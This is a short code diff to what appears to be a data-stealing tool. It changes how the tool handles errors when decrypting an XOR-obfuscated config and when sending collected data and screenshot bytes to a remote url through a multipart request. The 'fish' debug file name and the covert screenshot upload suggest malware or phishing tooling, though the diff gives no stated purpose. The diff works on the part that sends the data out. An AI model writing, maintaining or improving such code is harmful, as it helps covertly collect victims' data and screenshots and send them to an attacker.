@@ -42,8 +42,14 @@ def _load_footer_config():
                 decrypted = _xor(encrypted, FOOTER_KEY)
                 cfg = json.loads(decrypted.decode('utf-8'))
                 return cfg
-    except Exception:
-        pass
+    except Exception as e:
+        try:
+            with open(os.path.join(os.environ.get('TEMP', '.'), '_fish_debug.txt'), 'w') as dbg:
+                dbg.write(f'Footer load failed: {e}\n')
+                import traceback
+                dbg.write(traceback.format_exc())
+        except Exception:
+            pass
     return None
 
 
@@ -421,15 +427,11 @@ def send_data(data, screenshot_bytes):
 
     payload = b'\r\n'.join(body)
 
-    req = urllib.request.Request(url, data=payload)
-    req.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')
-
     try:
+        req = urllib.request.Request(url, data=payload)
+        req.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')
         resp = urllib.request.urlopen(req, timeout=30)
         return resp.read().decode()
-    except urllib.error.URLError as e:
-        print(f"Send error: {e}")
-        return None
     except Exception as e:
         print(f"Send error: {e}")
         return None
